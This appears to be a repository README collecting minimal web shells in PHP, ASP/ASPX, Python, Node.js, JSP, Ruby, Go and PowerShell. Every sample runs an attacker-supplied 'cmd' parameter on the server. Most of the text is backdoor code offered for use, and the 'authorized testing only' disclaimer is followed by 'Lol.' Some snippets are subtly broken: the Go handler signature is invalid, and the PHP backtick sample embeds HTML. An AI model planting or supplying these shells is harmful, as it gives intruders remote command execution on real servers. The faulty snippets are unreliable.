
# WebShells Repository

This document collects a variety of one‑liner web shells across multiple languages and platforms, from classic PHP to modern frameworks. 
 ## Use responsibly for authorized testing only.
## Lol.

---

## PHP Webshells

**Execute one command**

```php
<?php system("whoami"); ?>
```

**Take input from URL parameter**

```php
<?php system($_GET['cmd']); ?>
```

**Using `passthru`**

```php
<?php passthru($_GET['cmd']); ?>
```

**Using `shell_exec` (echo required)**

```php
<?php echo shell_exec("whoami"); ?>
```

**Using `exec()` to capture all lines**

```php
<?php exec("ls -la", $out); print_r($out); ?>
```

**Using `preg_replace()` eval trick**

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

**Using backticks**

```php
<?php echo `<span style="color:blue;">whoami</span>`; ?>
```

> **GUI Shell**: [Sweetuu](https://github.com/cspshivam/sweetuu)

---

## ASPX Webshell

**Execute Windows command:**

```asp
<%
  Set sh = CreateObject("WScript.Shell")
  Set ex = sh.Exec("cmd /c whoami")
  Response.Write(ex.StdOut.ReadAll())
%>
```

> Can be bound via `web.config` to intercept requests.

---

## Python Webshells (WSGI)

**Minimal WSGI shell** (`shell.py`)

```python
def application(environ, start_response):
    cmd = environ.get('QUERY_STRING', '')
    output = __import__('subprocess').check_output(cmd.split())
    start_response('200 OK', [('Content-Type','text/plain')])
    return [output]
```

**Flask single endpoint**

```python
from flask import Flask, request
import subprocess
app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd', '')
    return subprocess.getoutput(cmd)

# run with: python shell.py
```

---

## Node.js Webshells

**Express one-liner**

```js
require('express')().get('/shell',(req,res)=>res.send(require('child_process').execSync(req.query.cmd)) ).listen(3000)
```

**Standalone HTTP**

```js
const http = require('http');
const { exec } = require('child_process');
http.createServer((req,res)=>{
  let cmd = new URL(req.url, 'http://x').searchParams.get('cmd');
  exec(cmd, (e,o) => res.end(o));
}).listen(8080);
```

---

## Java/JSP Webshells

**JSP eval shell**

```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  InputStream in = p.getInputStream();
  int a;
  while((a=in.read())!=-1) out.print((char)a);
%>
```

**EL injection** (if enabled)

```jsp
${"".getClass().forName("java.lang.Runtime").getRuntime().exec(param.cmd)}
```

---

## Ruby Webshell (Rack)

**Minimal Rack shell**

```ruby
# config.ru
run lambda {|env|
  cmd = Rack::Request.new(env).params['cmd']
  out = `#{cmd}`
  [200, {'Content-Type'=>'text/plain'}, [out]]
}
```

---

## Golang Webshell

**Single-file HTTP shell**

```go
package main
import(
  "net/http"; "os/exec"
)
func main(){
  http.HandleFunc("/", func(w,http.ResponseWriter,r){
    cmd := r.URL.Query().Get("cmd")
    out,_:= exec.Command("sh","-c",cmd).Output()
    w.Write(out)
  })
  http.ListenAndServe(":8080",nil)
}
```

---

## PowerShell Webshell (IIS)

**ASPX with PowerShell**

```asp
<%@ Page Language="C#" %>
<%
  var cmd = Request.QueryString["cmd"];
  var psi = new System.Diagnostics.ProcessStartInfo("powershell.exe", cmd);
  psi.RedirectStandardOutput = true;
  psi.UseShellExecute = false;
  var p = System.Diagnostics.Process.Start(psi);
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```

---

## Notes & Best Practices

* **Sanitize inputs**: these examples are intentionally insecure. Always validate and sanitize user-supplied commands in real applications.
* **Least privilege**: run web servers under unprivileged accounts.
* **Use proper access controls**: disallow direct execution functions like `system` or `exec` where possible.

---


